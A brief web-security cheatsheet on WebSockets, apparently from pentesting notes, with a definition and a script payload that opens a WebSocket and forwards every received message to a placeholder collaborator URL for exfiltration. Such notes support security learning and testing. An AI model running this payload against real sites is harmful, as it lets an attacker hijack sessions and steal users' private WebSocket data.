# Websocket

## Definition

A **WebSocket** is a protocol for bidirectional, full-duplex communication over a single TCP connection. It is a modern, efficient, and secure way for web applications to communicate with each other in real-time. With WebSockets, a web application can send and receive data in real-time without the need for continuous polling, which can reduce latency and improve performance. WebSockets are often used in applications such as online gaming, chat, and real-time data visualization.

## Cheatsheet

- XSS in websocket
- Exfil WS data

```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```


## References

- [PortSwigger - Websocket](https://portswigger.net/web-security/websockets/)